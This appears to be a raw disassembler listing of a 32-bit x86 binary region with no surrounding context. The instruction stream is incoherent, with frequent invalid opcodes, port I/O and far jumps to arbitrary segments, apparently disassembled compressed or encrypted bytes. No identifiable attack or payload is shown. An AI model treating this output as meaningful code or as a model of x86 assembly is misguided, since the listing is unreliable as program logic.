  40692d:	loop   0x4068d7
  40692f:	sbb    BYTE PTR [edx],ch
  406931:	xchg   edi,eax
  406932:	adc    bh,BYTE PTR [edx+edi*2]
  406935:	std    
  406936:	add    eax,0xce86a2c7
  40693b:	lock push ss
  40693d:	in     al,0xf4
  40693f:	push   edx
  406940:	jecxz  0x4068e7
  406942:	push   0x2
  406944:	mov    BYTE PTR [ebx-0xecf647d],cl
  40694a:	out    0x82,eax
  40694c:	fmul   DWORD PTR [edx*1+0xcd9ccfc]
  406953:	enter  0x7d94,0xa3
  406957:	lock dec BYTE PTR [eax+esi*1-0x67]
  40695c:	mov    ecx,0x2143e115
  406961:	rol    eax,cl
  406963:	add    al,0x26
  406965:	or     al,BYTE PTR [ebp+ebx*8+0x48]
  406969:	out    0xf8,eax
  40696b:	pop    ecx
  40696c:	into   
  40696d:	mov    ds:0xd7e750da,eax
  406972:	rep ins DWORD PTR es:[edi],dx
  406974:	imul   BYTE PTR [esi-0x4a4f6b]
  40697a:	or     bl,BYTE PTR [edx-0x2c]
  40697d:	xor    al,0x91
  40697f:	fadd   st(6),st
  406981:	ret    0xe720
  406984:	fstp   QWORD PTR [ecx-0x6924273c]
  40698a:	(bad)  
  40698c:	shl    DWORD PTR [edx+ecx*1],1
  40698f:	test   al,0xf8
  406991:	leave  
  406992:	xor    esp,edi
  406994:	mov    esi,0x88fc7fb1
  406999:	in     al,0x80
  40699b:	dec    edx
  40699c:	xchg   ecx,eax
  40699d:	mov    cl,0xa1
  40699f:	test   DWORD PTR [ebx+0x78],ebp
  4069a2:	mov    bl,0x32
  4069a4:	outs   dx,BYTE PTR ds:[esi]
  4069a5:	cdq    
  4069a6:	mov    DWORD PTR [ebx+esi*2+0x6ad738aa],edi
  4069ad:	stos   DWORD PTR es:[edi],eax
  4069ae:	jle    0x4069d2
  4069b0:	cmp    BYTE PTR [edi],dl
  4069b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4069b3:	cmp    edi,ecx
  4069b5:	lock and edx,ecx
  4069b8:	xor    ebx,DWORD PTR [edx-0x63888309]
  4069be:	fnstenv [ebp+0x18]
  4069c1:	iret   
  4069c2:	ds adc edi,0xa
  4069c6:	and    al,0x9
  4069c8:	jno    0x406a25
  4069ca:	mov    bh,0x41
  4069cc:	dec    ebp
  4069cd:	stc    
  4069ce:	(bad)
  4069d1:	mov    eax,0x9394ca66
  4069d6:	les    ebx,FWORD PTR [ebx+0xf1f3be1]
  4069dc:	or     eax,0x3e7548cd
  4069e1:	rol    BYTE PTR [edx],0xc3
  4069e4:	pushf  
  4069e5:	into   
  4069e6:	sbb    esi,edi
  4069e8:	and    ah,BYTE PTR [ecx]
  4069ea:	inc    esp
  4069eb:	pop    ebp
  4069ec:	xlat   BYTE PTR ds:[ebx]
  4069ed:	jnp    0x4069b1
  4069ef:	push   edi
  4069f0:	sbb    cl,0x2a
  4069f3:	dec    esp
  4069f4:	push   edi
  4069f5:	ret    
  4069f6:	ins    DWORD PTR es:[edi],dx
  4069f7:	and    eax,0x43fd89c7
  4069fc:	mov    BYTE PTR [eax+ebp*1+0x3c],bl
  406a00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a01:	leave  
  406a02:	test   ebx,esi
  406a04:	ja     0x4069e5
  406a06:	inc    eax
  406a07:	inc    ecx
  406a08:	(bad)  
  406a09:	arpl   WORD PTR [ecx+eax*1+0x3a],bp
  406a0d:	push   edx
  406a0e:	inc    eax
  406a0f:	or     al,0x7a
  406a11:	ins    DWORD PTR es:[edi],dx
  406a12:	add    DWORD PTR [edi+0x453d971f],ebp
  406a18:	jmp    0x9702:0x194e2ef0
  406a1f:	push   ecx
  406a20:	les    ecx,FWORD PTR [eax]
  406a22:	jns    0x406a23
  406a24:	push   ss
  406a25:	mov    al,ds:0x7f9669b7
  406a2a:	cmc    
  406a2b:	or     BYTE PTR [eax],al
  406a2d:	mov    bl,0x74
  406a2f:	or     BYTE PTR [esi+ecx*2-0x45],al
  406a33:	shl    edi,0xde
  406a36:	icebp  
  406a37:	jle    0x406a48
  406a39:	int    0x7e
  406a3b:	xchg   ebp,esi
  406a3d:	inc    eax
  406a3e:	xchg   esp,eax
  406a3f:	scas   al,BYTE PTR es:[edi]
  406a40:	scas   al,BYTE PTR es:[edi]
  406a41:	test   BYTE PTR [esi-0x318dffe8],bh
  406a47:	call   0x94968a3
  406a4c:	jno    0x406ac3
  406a4e:	jmp    ebp
  406a50:	(bad)  
  406a51:	repz push edi
  406a53:	inc    edi
  406a54:	call   0x473a:0x1ad1c93d
  406a5b:	mov    BYTE PTR [ebx+0x18cfb621],0x25
  406a62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a63:	xlat   BYTE PTR ds:[ebx]
  406a64:	jmp    0x406a1a
  406a66:	add    ecx,DWORD PTR [ecx+0x7d5b0715]
  406a6c:	(bad)  
  406a6d:	hlt    
  406a6e:	jmp    0xc8ed:0xdae635f7
  406a75:	shr    BYTE PTR ds:0xf9fde6bd,0x40
  406a7c:	push   edi
  406a7d:	or     bh,al
  406a7f:	add    al,0x68
  406a81:	sahf   
  406a82:	adc    ch,BYTE PTR [ecx]
  406a84:	mov    ecx,0xacc95ebd
  406a89:	jmp    0x406a20
  406a8b:	push   edx
  406a8c:	mov    al,0x95
  406a8e:	add    DWORD PTR [edi+0x2fb3e49d],esi
  406a94:	(bad)  
  406a95:	sti    
  406a96:	(bad)  
  406a97:	adc    DWORD PTR [ecx+0x3e],edx
  406a9a:	sbb    eax,0x27bd0cad
  406a9f:	nop
  406aa0:	cld    
  406aa1:	and    DWORD PTR es:[edi+0x37],ebp
  406aa5:	inc    edx
  406aa6:	ss nop
  406aa8:	adc    ch,BYTE PTR [esi-0x5125c02b]
  406aae:	or     eax,0x848d575d
  406ab3:	mov    dh,0x6
  406ab5:	adc    DWORD PTR ds:0x5ab7570a,0x7d
  406abc:	jae    0x406b36
  406abe:	jno    0x406b1f
  406ac0:	arpl   bp,sp
  406ac2:	adc    DWORD PTR [esi],ebp
  406ac4:	jp     0x406abb
  406ac6:	or     eax,0x351264ba
  406acb:	xchg   esp,eax
  406acc:	fldcw  WORD PTR ds:[ebx+0x16]
  406ad0:	jmp    0x406ad4
  406ad2:	adc    al,BYTE PTR [eax+0x2ec0c5ac]
  406ad8:	pop    ecx
  406ad9:	mov    cl,0x4
  406adb:	fsubrp st(3),st
  406add:	add    BYTE PTR [esi+eax*8+0x4d84afc5],al
  406ae4:	popf   
  406ae5:	int    0x35
  406ae7:	sti    
  406ae8:	cwde   
  406ae9:	xchg   esp,eax
  406aea:	in     al,0xb2
  406aec:	cmc    
  406aed:	and    al,0xce
  406aef:	lahf   
  406af0:	push   ecx
  406af1:	add    eax,0xd8449314
  406af6:	sahf   
  406af7:	xor    eax,0xb6ebb59
  406afc:	mov    esp,0x5562ae10
  406b01:	in     al,dx
  406b02:	ins    BYTE PTR es:[edi],dx
  406b03:	out    0xc2,al
  406b05:	(bad)  
  406b06:	pop    edi
  406b07:	mov    DWORD PTR [esi+0x36ae2442],edx
  406b0d:	adc    DWORD PTR [eax+0x473fcd27],eax
  406b13:	inc    edi
  406b14:	popf   
  406b15:	or     ebp,DWORD PTR [edx]
  406b17:	adc    bl,bh
  406b19:	push   0x81e4392f
  406b1e:	repnz imul eax,DWORD PTR [eax-0x1614a9d6],0xd348c969
  406b29:	ja     0x406ad2
  406b2b:	rcr    dl,0x9c
  406b2e:	addr16 test al,0x4e
  406b31:	in     al,0x3b
  406b33:	push   edi
  406b34:	xchg   ecx,eax
  406b35:	pushf  
  406b36:	mov    DWORD PTR [esi-0x402fa235],esi
  406b3c:	cmp    al,0xce
  406b3e:	cwde   
  406b3f:	and    dh,BYTE PTR [ebp+0x297f8a3f]
  406b45:	int3   
  406b46:	ds push ebp
  406b48:	xor    BYTE PTR [edx],0xac
  406b4b:	or     ah,ah
  406b4d:	inc    esp
  406b4e:	push   eax
  406b4f:	repz push ebp
  406b51:	adc    DWORD PTR [ebp+0x43],eax
  406b54:	add    BYTE PTR [eax-0x2e],dl
  406b57:	mov    gs,WORD PTR [ecx]
  406b59:	sub    eax,0x27d0e86d
  406b5e:	xor    al,0x87
  406b60:	rcr    BYTE PTR [eax+ebx*2+0x155b5247],1
  406b67:	add    dl,BYTE PTR [ebx+0x99b9296]
  406b6d:	add    ch,bl
  406b6f:	mov    dh,0xc7
  406b71:	jg     0x406b2f
  406b73:	add    BYTE PTR [ecx],0xf4
  406b76:	ins    BYTE PTR es:[edi],dx
  406b77:	(bad)  
  406b78:	jge    0x406bd1
  406b7a:	stos   DWORD PTR es:[edi],eax
  406b7b:	clc    
  406b7c:	cdq    
  406b7d:	retf   0x3d39
  406b80:	sub    DWORD PTR [edi-0x664f3cb5],eax
  406b86:	stos   BYTE PTR es:[edi],al
  406b87:	or     eax,0x409a3e35
  406b8c:	cmp    al,0x81
  406b8e:	daa    
  406b8f:	jmp    0x35f1:0x4571eb6e
  406b96:	repnz clc 
  406b98:	sbb    eax,0xbe0c4ccb
  406b9d:	pop    ss
  406b9e:	inc    ecx
  406b9f:	inc    ebp
  406ba0:	adc    eax,0xac451d42
  406ba5:	mov    WORD PTR [edi-0x2c],ds
  406ba8:	cmp    al,0xb8
  406baa:	push   esp
  406bab:	or     DWORD PTR [eax],0x1ed33071
  406bb1:	ret    0xb2ee
  406bb4:	repz push cs
  406bb6:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  406bb8:	ja     0x406b3f
  406bba:	sub    ebp,edi
  406bbc:	pop    ebp
  406bbd:	lds    edx,FWORD PTR [ebx+ecx*8-0x2a]
  406bc1:	and    bl,BYTE PTR [ecx]
  406bc3:	nop
  406bc4:	xor    ebp,esp
  406bc6:	or     DWORD PTR [esi-0xe],esp
  406bc9:	loope  0x406b67
  406bcb:	push   ebx
  406bcc:	xchg   ebx,eax
  406bcd:	jbe    0x406c21
  406bcf:	lods   al,BYTE PTR ds:[esi]
  406bd0:	mov    edx,edi
  406bd2:	es xchg si,ax
  406bd5:	pushf  
  406bd6:	push   edx
  406bd7:	dec    esi
  406bd8:	ja     0x406c25
  406bda:	das    
  406bdb:	fs inc ebx
  406bdd:	in     eax,0xdf
  406bdf:	jl     0x406c45
  406be1:	imul   ecx,esi,0xf7a463e4
  406be7:	test   eax,0x88bfe417
  406bec:	or     al,dh
  406bee:	data16 mov dh,0xc3
  406bf1:	push   ebp
  406bf2:	cmc    
  406bf3:	out    dx,eax
  406bf4:	mov    ds:0x44293ce1,eax
  406bf9:	mov    dh,0x80
  406bfb:	retf   
  406bfc:	repz fwait
  406bfe:	scas   al,BYTE PTR es:[edi]
  406bff:	and    al,0x28
  406c01:	(bad)  
  406c02:	outs   dx,DWORD PTR ds:[esi]
  406c03:	js     0x406c3a
  406c05:	imul   ecx,DWORD PTR [eax+0x4333b886],0xd1ff1ea1
  406c0f:	fdiv   DWORD PTR [edx-0x2b26cf90]
  406c15:	loop   0x406c8c
  406c17:	stos   BYTE PTR es:[edi],al
  406c18:	repnz xor esi,DWORD PTR ds:0xb8bdf02c
  406c1f:	hlt    
  406c20:	mov    al,0xb8
  406c22:	stc    
  406c23:	adc    esp,edi
  406c25:	arpl   WORD PTR [edx+0x3c],dx
  406c28:	pop    eax
  406c29:	inc    cx
  406c2b:	test   BYTE PTR [ecx-0x24],al
  406c2e:	das    
  406c2f:	jmp    0x406bb2
  406c31:	test   al,0x59
  406c33:	xor    DWORD PTR [esi-0x7bcf9f9d],ebx
  406c39:	xlat   BYTE PTR ds:[ebx]
  406c3a:	addr16 pushf 
  406c3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c3d:	inc    edi
  406c3e:	inc    eax
  406c3f:	push   es
  406c40:	in     al,0xab
  406c42:	mov    bh,0x1
  406c44:	pop    ebx
  406c45:	xchg   esp,eax
  406c46:	aas    
  406c47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c48:	shl    DWORD PTR [edi+ebp*4],cl
  406c4b:	(bad)  
  406c4c:	mov    WORD PTR [ebx],ss
  406c4e:	imul   edx,DWORD PTR [eax+0x1b],0x7c
  406c52:	push   esi
  406c53:	lods   al,BYTE PTR ds:[esi]
  406c54:	es pop ds
  406c56:	jmp    0x81747e47
  406c5b:	cmp    BYTE PTR [ebx-0x1a60c5af],ch
  406c61:	lods   eax,DWORD PTR ds:[esi]
  406c62:	mov    ds:0xb34d5944,eax
  406c67:	and    ebx,ebp
  406c69:	je     0x406c61
  406c6b:	adc    DWORD PTR [ebx+edx*1-0x69],0x3ee9d36f
  406c73:	xchg   DWORD PTR [edi+0x322090ea],esi
  406c79:	outs   dx,DWORD PTR ds:[esi]
  406c7a:	add    BYTE PTR [ecx+0x483296f1],ah
  406c80:	gs daa 
  406c82:	inc    DWORD PTR [edx]
  406c84:	fsubr  st,st(7)
  406c86:	(bad)  
  406c87:	lods   eax,DWORD PTR ds:[esi]
  406c88:	or     eax,0xdd91950f
  406c8d:	sub    eax,0x315b45ab
  406c92:	mov    ecx,0x2de96c55
  406c97:	dec    ebp
  406c98:	mov    esp,0xf7cdac86
  406c9d:	stos   BYTE PTR es:[edi],al
  406c9e:	paddq  mm4,QWORD PTR ds:0x1c675a64
  406ca5:	push   esp
  406ca6:	rcl    BYTE PTR [ebp+ebx*4-0x2f4fe1df],cl
  406cad:	dec    esi
  406cae:	add    DWORD PTR [ecx],eax
  406cb0:	and    DWORD PTR ds:0xe91b9900,ecx
  406cb6:	neg    cl
  406cb8:	sub    DWORD PTR [ecx-0x1400521b],esp
  406cbe:	pop    ss
  406cbf:	nop
  406cc0:	aam    0x39
  406cc2:	aas    
  406cc3:	or     al,BYTE PTR [ebx+0x35]
  406cc6:	sbb    eax,0x168fc11f
  406ccb:	cmp    dh,BYTE PTR [ebp+0x5e]
  406cce:	rcl    BYTE PTR [edi+0x6c],0x24
  406cd2:	popa   
  406cd3:	jmp    0x406d4e
  406cd5:	pop    esi
  406cd6:	pop    edx
  406cd7:	stos   BYTE PTR es:[edi],al
  406cd8:	ss xchg esp,eax
  406cda:	xchg   ecx,eax
  406cdb:	mov    cl,0x7a
  406cdd:	xlat   BYTE PTR ds:[ebx]
  406cde:	mov    al,0x59
  406ce0:	or     esp,DWORD PTR [eax+0x37]
  406ce3:	jmp    0xf99b02d2
  406ce8:	mov    al,ds:0x7766170a
  406ced:	stc    
  406cee:	mov    eax,ds:0x3b6a50c3
  406cf3:	retf   
  406cf4:	(bad)  
  406cf5:	mov    esp,0x67de776b
  406cfa:	xchg   esp,eax
  406cfb:	mov    ebp,0xc6928223
  406d00:	shl    BYTE PTR [edi-0x5c],0x51
  406d04:	fst    DWORD PTR [esp+ebx*4-0x244ace5]
  406d0b:	into   
  406d0c:	leave  
  406d0d:	and    eax,0x2903d55e
  406d12:	iret   
  406d13:	pop    ebx
  406d14:	rcl    esi,cl
  406d16:	dec    edi
  406d17:	mov    al,0x76
  406d19:	ror    ch,cl
  406d1b:	dec    edx
  406d1c:	lahf   
  406d1d:	data16 lahf 
  406d1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d20:	imul   edx,DWORD PTR [edx+0x51bf39bd],0xee16b497
  406d2a:	inc    ecx
  406d2b:	sbb    al,0x1
  406d2d:	add    eax,0x9b915f22
  406d32:	cdq    
  406d33:	call   0x3a19:0x73edb2b9
  406d3a:	mov    ds:0x69707d98,al
  406d3f:	rol    DWORD PTR [esi-0x1ce7c8c1],1
  406d45:	js     0x406d0a
  406d47:	jnp    0x406d36
  406d49:	repnz iret 
  406d4b:	mov    eax,0xee4f93ff
  406d50:	shl    dl,1
  406d52:	dec    esi
  406d53:	pushf  
  406d54:	and    DWORD PTR [edx-0x1b730abc],eax
  406d5a:	cmp    BYTE PTR [ecx],cl
  406d5c:	jmp    0x406d34
  406d5e:	sbb    al,0x75
  406d60:	(bad)  
  406d61:	mov    dh,0x74
  406d63:	dec    esi
  406d64:	pop    esp
  406d65:	repnz cmp al,0x35
  406d68:	pop    ebx
  406d69:	inc    edi
  406d6a:	xlat   BYTE PTR ds:[ebx]
  406d6b:	mov    bl,0xa2
  406d6d:	dec    esp
  406d6e:	and    BYTE PTR [eax],ch
  406d70:	aam    0x39
  406d72:	jge    0x406d76
  406d74:	jno    0x406d93
  406d76:	dec    ebx
  406d77:	and    BYTE PTR [ecx-0x65],dh
  406d7a:	(bad)  
  406d7b:	sub    ch,BYTE PTR [ecx+edi*4-0x9]
  406d7f:	push   edi
  406d80:	repz jmp FWORD PTR gs:[ebp+0x46c1192b]
  406d88:	(bad)  
  406d89:	rcr    DWORD PTR [ebp+0x53],0xc8
  406d8d:	jb     0x406d66
  406d8f:	(bad)  
  406d90:	add    DWORD PTR [ebp-0x5347590a],ebx
  406d96:	mov    eax,ds:0xa18b7f39
  406d9b:	sbb    al,0x5a
  406d9d:	cmp    eax,0x1651e341
  406da2:	enter  0xd743,0x4d
  406da6:	or     ebx,DWORD PTR [edi]
  406da8:	call   0x2a53:0xa3d2110b
  406daf:	leave  
  406db0:	mov    bh,0xc9
  406db2:	repz sahf 
  406db4:	repnz add eax,0xd91b5cc1
  406dba:	push   es
  406dbb:	aaa    
  406dbc:	outs   dx,BYTE PTR ds:[si]
  406dbe:	in     al,0xb9
  406dc0:	push   0xffffff84
  406dc2:	push   es
  406dc3:	fstp   st(0)
  406dc5:	dec    edx
  406dc6:	pop    es
  406dc7:	xor    eax,0x3b3de64
  406dcc:	or     ebp,DWORD PTR [ecx-0x448dc113]
  406dd2:	push   es
  406dd3:	clc    
  406dd4:	addr16 cmc 
  406dd6:	dec    edx
  406dd7:	jb     0x406d63
  406dd9:	or     DWORD PTR [ebp-0xd958d16],0x27ebff0e
  406de3:	inc    ebp
  406de4:	lods   eax,DWORD PTR ds:[esi]
  406de5:	mov    ds:0xb23aa7e3,eax
  406dea:	jno    0x406e3f
  406dec:	cwde   
  406ded:	in     al,dx
  406dee:	mov    ds:0xbf83944d,al
  406df3:	mov    esp,0xd9b9d4a8
  406df8:	adc    al,0x82
  406dfa:	fld    QWORD PTR [ebx+0x1d500aa7]
  406e00:	stc    
  406e01:	push   edx
  406e02:	ds (bad) 
  406e04:	hlt    
  406e05:	sbb    eax,0xb8c054c7
  406e0a:	inc    ebx
  406e0b:	es dec edi
  406e0d:	xor    DWORD PTR [ecx-0x7e],0x76816617
  406e14:	fistp  DWORD PTR [edi+0x7c]
  406e17:	xor    al,0xd8
  406e19:	int3   
  406e1a:	std    
  406e1b:	fld    QWORD PTR [ebp+0x3681c4ec]
  406e21:	pop    ds
  406e22:	or     ah,BYTE PTR [esi+0x428a02ad]
  406e28:	lock mov ah,0x8a
  406e2b:	das    
  406e2c:	dec    esp
  406e2d:	dec    edx
  406e2e:	xchg   edx,eax
  406e2f:	int3   
  406e30:	inc    ebp
  406e31:	inc    edi
  406e32:	loope  0x406df5
  406e34:	ret    
  406e35:	cld    
  406e36:	cdq    
  406e37:	sbb    DWORD PTR [edx],ebp
  406e39:	lahf   
  406e3a:	loopne 0x406ddd
  406e3c:	jmp    0x376386c1
  406e41:	pop    esp
  406e42:	in     eax,0x43
  406e44:	or     cl,BYTE PTR [ecx+0x299288c]
  406e4a:	sub    cl,cl
  406e4c:	sub    eax,0x1655a543
  406e51:	fisubr WORD PTR [edi+esi*1-0x17]
  406e55:	clc    
  406e56:	mov    bl,0xa3
  406e58:	test   BYTE PTR [ebp+ecx*1+0x48],ch
  406e5c:	int3   
  406e5d:	xorps  xmm4,xmm5
  406e60:	cmp    DWORD PTR [bx-0x39],0xd9b7e73b
  406e68:	dec    esp
  406e69:	push   esp
  406e6a:	jecxz  0x406e75
  406e6c:	xchg   edi,eax
  406e6d:	lods   al,BYTE PTR ss:[esi]
  406e6f:	jno    0x406e04
  406e71:	ins    BYTE PTR es:[edi],dx
  406e72:	xchg   ecx,eax
  406e73:	mov    al,0xd4
  406e75:	mov    bl,BYTE PTR [eax+eiz*8-0x3f]
  406e79:	retf   
  406e7a:	fst    DWORD PTR [eax+0x40]
  406e7d:	ins    DWORD PTR es:[edi],dx
  406e7e:	test   BYTE PTR [esi],dl
  406e80:	test   eax,0xc5d0f471
  406e85:	bound  edi,QWORD PTR [eax]
  406e87:	jmp    0x406e84
  406e89:	mov    ds:0x35bbdb45,eax
  406e8e:	inc    ebx
  406e8f:	mov    bl,BYTE PTR [ebp+0x5f]
  406e92:	mov    ch,BYTE PTR [edi+0x5]
  406e95:	ins    BYTE PTR es:[edi],dx
  406e96:	pop    ds
  406e97:	mov    al,0x76
  406e99:	inc    esp
  406e9a:	mov    bl,0xee
  406e9c:	sti    
  406e9d:	(bad)  
  406e9e:	xor    eax,0xb4d8e3b3
  406ea3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ea4:	mov    eax,0xf38161f4
  406ea9:	pusha  
  406eaa:	(bad)  
  406eab:	adc    ebp,ebx
  406ead:	push   edi
  406eae:	pop    eax
  406eaf:	xchg   ecx,eax
  406eb0:	mov    esi,0x48052427
  406eb5:	fnsave [edi-0x51]
  406eb8:	adc    cl,BYTE PTR [ecx-0x1a9e9e98]
  406ebe:	push   0x2c55bc2c
  406ec3:	sub    esp,DWORD PTR [edi-0x5e125d3b]
  406ec9:	call   0x262:0x1747c608
  406ed0:	shl    BYTE PTR [edx+0x4e],0x4
  406ed4:	and    esi,esp
  406ed6:	cld    
  406ed7:	fs jns 0x406ed9
  406eda:	into   
  406edb:	jecxz  0x406ecd
  406edd:	leave  
  406ede:	fnstcw WORD PTR [ecx]
  406ee0:	adc    DWORD PTR ss:[ecx],0x54fc8eab
  406ee7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ee8:	fsub   QWORD PTR [edi]
  406eea:	or     DWORD PTR [edi+eax*8],0x4bea7838
  406ef1:	rol    ebp,cl
  406ef3:	sub    DWORD PTR [ebx+esi*4],edi
  406ef6:	js     0x406ee3
  406ef8:	cmc    
  406ef9:	daa    
  406efa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406efb:	mov    al,ds:0xa2bbeb0f
  406f00:	cmp    bl,BYTE PTR [edi-0x2608a143]
  406f06:	push   edi
  406f07:	addr16 pop esp
  406f09:	jp     0x406f12
  406f0b:	in     al,0x87
  406f0d:	xor    dh,BYTE PTR [ecx]
  406f0f:	push   esp
  406f10:	xor    ah,BYTE PTR ss:[eax-0x5b]
  406f14:	in     al,dx
  406f15:	mov    esp,0x51dfba45
  406f1a:	xor    BYTE PTR [eax],cl
  406f1c:	in     eax,dx
  406f1d:	(bad)  
  406f1e:	fs push edi
  406f20:	adc    DWORD PTR [ebp+0x41],ecx
  406f23:	pop    ecx
  406f24:	js     0x406f5e
  406f26:	jmp    0x406f79
  406f28:	inc    esp
  406f29:	out    0x43,al
  406f2b:	call   0x3548:0xde6b863a
  406f32:	bound  esp,QWORD PTR [eax]
  406f34:	inc    ebx
  406f35:	push   ss
  406f36:	add    eax,0x190d5b91
  406f3b:	push   esp
  406f3c:	not    DWORD PTR [ebp-0x59]
  406f3f:	xchg   edi,eax
  406f40:	mov    ds:0x5eb2f2da,al
  406f45:	fcmove st,st(2)
  406f47:	pop    ebx
  406f48:	sub    dl,BYTE PTR [edi-0x5]
  406f4b:	and    BYTE PTR [edi+0x22],cl
  406f4e:	aas    
  406f4f:	(bad)  
  406f50:	popa   
  406f51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f52:	sub    eax,0x54dac31f
  406f57:	inc    ebp
  406f58:	icebp  
  406f59:	test   BYTE PTR fs:[esi],0x73
  406f5d:	jns    0x406f3b
  406f5f:	mov    esi,DWORD PTR [ecx+0x1]
  406f62:	pop    esp
  406f63:	mov    esp,0xea1bf7cb
  406f68:	in     al,0xba
  406f6a:	xchg   esp,eax
  406f6b:	rol    cl,0x11
  406f6e:	scas   eax,DWORD PTR es:[edi]
  406f6f:	lock fs xchg edi,eax
  406f72:	test   DWORD PTR [ecx],edi
  406f74:	loop   0x406f7e
  406f76:	in     al,0x13
  406f78:	jne    0x406f62
  406f7a:	push   edx
  406f7b:	mov    ah,0x68
  406f7d:	lahf   
  406f7e:	dec    esi
  406f7f:	sbb    DWORD PTR [esi-0x76db759e],ebx
  406f85:	pop    ss
  406f86:	mov    ecx,0xd3001420
  406f8b:	cmp    eax,0x25f2ecb0
  406f90:	out    0xc2,al
  406f92:	and    BYTE PTR [ebp+0x12],0x87
  406f96:	and    eax,0x6a977537
  406f9b:	xchg   ecx,eax
  406f9c:	sbb    al,0xd5
  406f9e:	js     0x406f48
  406fa0:	mov    ah,0xd6
  406fa2:	sub    dl,BYTE PTR [edx]
  406fa4:	sbb    ecx,esp
  406fa6:	cmp    eax,eax
  406fa8:	daa    
  406fa9:	cmp    eax,0x19806735
  406fae:	pop    ss
  406faf:	jge    0x40701b
  406fb1:	push   0x136e98e2
  406fb6:	rol    ebx,0x34
  406fb9:	sbb    ecx,DWORD PTR [edx+0x7e]
  406fbc:	xor    BYTE PTR [esp+edx*2],ch
  406fbf:	adc    DWORD PTR [esp+edx*8],ebp
  406fc2:	je     0x406f92
  406fc4:	and    DWORD PTR [esi+0x1f],eax
  406fc7:	montmul (bad)
  406fc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406fc9:	add    BYTE PTR [ebx],ch
  406fcb:	lock push ds
  406fcd:	or     DWORD PTR [edx+0x6a26529c],esp
  406fd3:	jno    0x406fdd
  406fd5:	sbb    BYTE PTR [ebx+0xa86d498],0x56
  406fdc:	std    
  406fdd:	pop    edx
  406fde:	or     BYTE PTR [edx-0x41f30e95],dl
  406fe4:	loop   0x406fa9
  406fe6:	cs lahf 
  406fe8:	jb     0x406fd9
  406fea:	mov    ah,0x54
  406fec:	add    ecx,DWORD PTR [ebp-0x49]
  406fef:	mov    ah,BYTE PTR [eax+0x36]
  406ff2:	icebp  
  406ff3:	push   ebp
  406ff4:	or     eax,0xebb883ba
  406ff9:	push   ebx
  406ffb:	push   esi
  406ffc:	arpl   WORD PTR [eax+0x4a],bx
  406fff:	xchg   ebx,eax
  407000:	fcomp  QWORD PTR [edi+0x4c]
  407003:	pop    edx
  407004:	gs xchg edi,eax
  407006:	xor    eax,0x35e33312
  40700b:	jmp    0x407068
  40700d:	nop
  40700e:	arpl   WORD PTR [ebx],di
  407010:	int3   
  407011:	mov    dl,0x7c
  407013:	imul   esi,esi,0x20
  407016:	mov    esi,0x533bc42e
  40701b:	js     0x406fe2
  40701d:	cmp    al,BYTE PTR [ebx]
  40701f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407020:	leave  
  407021:	jp     0x407063
  407023:	ins    DWORD PTR es:[edi],dx
  407024:	arpl   WORD PTR [eax-0x3f6950e7],cx
  40702a:	imul   esi,DWORD PTR [edi-0x14],0x5e8cd211
  407031:	dec    ecx
  407032:	dec    esi
  407033:	adc    al,0x91
  407035:	data16 or BYTE PTR [eax-0x48d209a8],ch
  40703c:	mov    DWORD PTR [edx],edi
  40703e:	stos   DWORD PTR es:[edi],eax
  40703f:	repz out dx,eax
  407041:	and    esi,ebp
  407043:	xchg   ebx,eax
  407044:	cs cli 
  407046:	xor    eax,0x121df411
  40704b:	call   0x371:0x674185ab
  407052:	xchg   ebx,eax
  407053:	fwait
  407054:	cmc    
  407055:	lea    edx,[edx+0xe]
  407058:	aad    0x9d
  40705a:	fdivr  st(3),st
  40705c:	adc    esp,DWORD PTR [edi+0x33]
  40705f:	adc    cl,dh
  407061:	mov    DWORD PTR [eax+ebp*4+0x6b],ecx
  407065:	sbb    ecx,DWORD PTR [ebp+0x69]
  407068:	jnp    0x4070e7
  40706a:	xor    ch,BYTE PTR [ebp+0x70]
  40706d:	or     dh,dl
  40706f:	mov    edx,0x1e20991e
  407074:	retf   0x4781
  407077:	pavgb  mm5,QWORD PTR ds:0xf218e199
  40707e:	or     ebp,DWORD PTR [edx-0x4b83829c]
  407084:	leave  
  407085:	inc    edi
  407086:	xor    al,bh
  407088:	stos   BYTE PTR es:[edi],al
  407089:	or     DWORD PTR [eax-0x33215dd5],esp
  40708f:	das    
  407090:	aas    
  407091:	inc    ecx
  407092:	rcr    DWORD PTR [eax-0x19db405c],cl
  407098:	nop
  407099:	xor    edx,DWORD PTR [edi+0x3b509a10]
  40709f:	mov    ah,0x80
  4070a1:	cs cwde 
  4070a3:	adc    al,0xb6
  4070a5:	in     al,dx
  4070a6:	pop    ss
  4070a7:	fcom   QWORD PTR [ebp-0x3883b40]
  4070ad:	sbb    al,0x6
  4070af:	sbb    BYTE PTR [edx],cl
  4070b1:	mov    dh,BYTE PTR [ecx]
  4070b3:	gs mov dh,0xb6
  4070b6:	pop    ds
  4070b7:	pop    ds
  4070b8:	cmp    DWORD PTR [ecx],0x45f45105
  4070be:	das    
  4070bf:	push   ebp
  4070c0:	mov    ah,0x64
  4070c2:	or     eax,0x1324a274
  4070c7:	enter  0xa549,0xbd
  4070cb:	aaa    
  4070cc:	add    BYTE PTR [edi],0x68
  4070cf:	imul   eax,DWORD PTR [edx-0x51],0x56c2daf5
  4070d6:	sbb    al,0x5f
  4070d8:	add    DWORD PTR [ebp+edi*1-0x4f],ebp
  4070dc:	ins    BYTE PTR es:[edi],dx
  4070dd:	mov    ecx,ds
  4070df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4070e0:	jle    0x40714e
  4070e2:	call   0xb6756b16
  4070e7:	mul    DWORD PTR [ebp+ecx*1-0x652825b6]
  4070ee:	pop    edx
  4070ef:	outs   dx,DWORD PTR ds:[esi]
  4070f0:	pop    ss
  4070f1:	add    BYTE PTR ds:0xf739983d,dh
  4070f7:	fidiv  DWORD PTR [eax-0x5346d6b7]
